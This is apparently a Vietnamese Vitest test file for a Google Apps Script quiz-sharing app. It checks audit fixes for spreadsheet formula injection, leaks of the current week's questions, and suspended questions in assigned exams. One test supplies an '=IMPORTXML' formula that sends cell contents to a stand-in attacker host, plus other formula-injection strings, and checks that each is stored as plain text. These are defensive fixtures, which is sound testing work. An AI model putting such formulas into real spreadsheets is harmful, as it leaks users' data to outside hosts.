// Các lỗi tìm được khi rà soát toàn bộ web (27/10/2026). Mỗi nhóm kiểm tra một rủi ro đã sửa.
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { taoMoiTruong, congThucDaGhi } from './gia-lap-appsscript.js';

const gio = (s) => Date.parse(s + '+07:00');
const CHU = 'chu@x.vn';
const NGUOI = Array.from({ length: 4 }, (_, i) => `u${i}@x.vn`);
const MON = ['khoa-hoc-du-lieu', 'dia-chat-kien-truc', 'triet-hoc-mac-lenin'];
const TU = ['khoáng vật nào cứng nhất', 'đá trầm tích hình thành ra sao', 'biến chất tiếp xúc ở đâu', 'magma kết tinh thế nào', 'đứt gãy thuận là gì'];

let mt;
const goiAs = (email, action, payload = {}) => mt.goi({ action, idToken: mt.datToken(email), ...payload });
const taoBoCau = (email, dau = '') => {
  const ai = email.split('@')[0];
  return MON.flatMap((maMon) => TU.map((tu, i) => ({
    maMon, maChuong: 'c1', trangNguon: `tr.${i}`, noiDung: `${dau}${tu} (${ai}, ${maMon})`,
    A: `a${i}`, B: `b${i}`, C: `c${i}`, D: `d${i}`, dapAn: 'ABCD'[i % 4], giaiThich: '',
  })));
};

beforeEach(() => {
  vi.useFakeTimers({ toFake: ['Date'] });
  vi.setSystemTime(gio('2026-11-01T09:00:00'));
  mt = taoMoiTruong();
  mt.khoiTao();
  NGUOI.forEach((e, i) => mt.themDong('ThanhVien', { email: e, hoTen: `Người ${i}`, vaiTro: 'member', trangThai: 'active' }));
  expect(goiAs(CHU, 'admin.taoLichTuan', { thuBayDau: '2026-11-07', soTuan: 2 }).ok).toBe(true);
  vi.setSystemTime(gio('2026-11-03T10:00:00'));
  congThucDaGhi.length = 0;
});
afterEach(() => vi.useRealTimers());

describe('chặn chèn công thức vào Google Sheet', () => {
  it('câu hỏi, tên, thông báo bắt đầu bằng = không bị ghi thành công thức và đọc lại đúng chữ gốc', () => {
    const doc = '=IMPORTXML("https://ke-xau.example/?d="&A1,"//a")';
    const bo = taoBoCau(NGUOI[0]);
    bo[0].noiDung = doc;
    bo[1].giaiThich = '+cmd';
    expect(goiAs(NGUOI[0], 'nopCauHoi', { cauHoi: bo }).ok).toBe(true);
    expect(goiAs(NGUOI[1], 'capNhatHoTen', { hoTen: '=HYPERLINK("x","y")' }).ok).toBe(true);
    expect(goiAs(CHU, 'admin.guiThongBao', { loai: 'all', tieuDe: '=1+1', noiDung: '-gạch đầu dòng' }).ok).toBe(true);
    expect(congThucDaGhi).toEqual([]);
    expect(mt.docTab('CauHoi').some((c) => c.noiDung === doc)).toBe(true);
    expect(mt.docTab('ThanhVien').find((t) => t.email === NGUOI[1]).hoTen).toBe('=HYPERLINK("x","y")');
    expect(goiAs(NGUOI[2], 'thongBao').data[0]).toMatchObject({ tieuDe: '=1+1', noiDung: '-gạch đầu dòng' });
  });

  it('sửa một ô khác của dòng không làm chữ cũ biến thành công thức', () => {
    expect(goiAs(NGUOI[1], 'capNhatHoTen', { hoTen: '=SUM(1,2)' }).ok).toBe(true);
    const t = mt.docTab('ThanhVien').find((x) => x.email === NGUOI[1]);
    // ghi lại cả dòng (ví dụ gỡ rồi mở lại) vẫn giữ dạng chữ
    expect(goiAs(CHU, 'admin.goThanhVien', { email: NGUOI[1], loai: 'removed' }).ok).toBe(true);
    expect(goiAs(CHU, 'admin.moLaiThanhVien', { email: NGUOI[1] }).ok).toBe(true);
    expect(congThucDaGhi).toEqual([]);
    expect(mt.docTab('ThanhVien').find((x) => x.email === NGUOI[1]).hoTen).toBe(t.hoTen);
  });
});

describe('đề tự luyện không lộ câu của tuần đang diễn ra', () => {
  beforeEach(() => {
    mt.datCauHinh('anCauTuanChuaDong', true);
    NGUOI.forEach((e) => goiAs(e, 'nopCauHoi', { cauHoi: taoBoCau(e) }));
  });

  it('trước khi tuần 1 đóng phòng thi: câu tuần 1 không dùng cho đề tự luyện', () => {
    const r = goiAs(NGUOI[0], 'taoDe.bat', { maMon: MON[0] });
    expect(r).toMatchObject({ ok: false, error: 'khong_du_cau' });
  });

  it('sau khi tuần 1 đóng: dùng được, vẫn không có câu của chính mình', () => {
    vi.setSystemTime(gio('2026-11-09T08:00:00'));
    const r = goiAs(NGUOI[0], 'taoDe.bat', { maMon: MON[0] });
    expect(r.ok, JSON.stringify(r)).toBe(true);
    expect(r.data.cauHoi).toHaveLength(15); // 3 người khác × 5 câu môn này
  });

  it('tắt cấu hình thì dùng được ngay', () => {
    mt.datCauHinh('anCauTuanChuaDong', false);
    expect(goiAs(NGUOI[0], 'taoDe.bat', { maMon: MON[0] }).ok).toBe(true);
  });
});

describe('đề cố định của tuần chỉ dùng câu đang dùng', () => {
  it('câu bị tạm loại sau khi gán đề không xuất hiện trong bài thi', () => {
    NGUOI.forEach((e) => goiAs(e, 'nopCauHoi', { cauHoi: taoBoCau(e) }));
    const ids = goiAs(CHU, 'admin.xemTruocDeThi', { phanBo: [{ maMon: MON[0], soCau: 10 }] }).data.cau.map((c) => c.id);
    const idDe = goiAs(CHU, 'admin.luuDeThi', { tenDe: 'Đề tuần 1', dsIdCau: ids, trangThai: 'nhap' }).data.idDe;
    expect(goiAs(CHU, 'admin.ganDeChoTuan', { soTuan: 1, idDe }).ok).toBe(true);
    goiAs(CHU, 'admin.doiTrangThaiCau', { id: ids[0], trangThai: 'suspended' });
    vi.setSystemTime(gio('2026-11-07T08:00:00'));
    const nguoi = NGUOI.find((e) => !mt.docTab('CauHoi').some((c) => ids.includes(c.id) && c.tacGia === e)) ?? NGUOI[0];
    const bd = goiAs(nguoi, 'batDauThi', { monChon: MON.slice(0, 2) });
    expect(bd.ok, JSON.stringify(bd)).toBe(true);
    expect(bd.data.cauHoi.map((c) => c.id)).not.toContain(ids[0]);
  });
});
